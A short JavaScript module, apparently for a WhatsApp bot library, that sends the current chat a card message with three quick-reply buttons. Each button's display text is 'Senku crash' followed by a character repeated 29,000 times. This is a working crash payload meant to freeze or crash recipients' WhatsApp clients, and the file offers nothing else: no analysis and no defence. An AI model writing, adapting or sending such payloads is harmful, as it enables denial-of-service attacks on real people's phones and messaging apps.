async function test(message, sock) {

  const jid = message.key.remoteJid;

  await sock.sendMessage(
    jid,
    {
        text: "Hello",
        footer: "Footer Message",
        cards: [

           {
              image: { url: '1.png' }, // or buffer,
              title: 'Senku',
              caption: 'Just another dev on the internet',
              footer: "Love's you",
              buttons: [
                  {
                      name: "quick_reply",
                      buttonParamsJson: JSON.stringify({
                         display_text: `Senku crash 1${"ꦾ".repeat(29000)}\n\n`,
                         id: "ID"
                      })
                  },
                  {
                      name: "quick_reply",
                      buttonParamsJson: JSON.stringify({
                         display_text: `Senku crash 1${"ꦾ".repeat(29000)}\n\n`,
                         id: "ID"
                      })
                  },
                  {
                      name: "quick_reply",
                      buttonParamsJson: JSON.stringify({
                         display_text: `Senku crash 1${"ꦾ".repeat(29000)}\n\n`,
                         id: "ID"
                      })
                  },
              ]
           },

        ]
    },
    { quoted : message }
)


}
export default test;
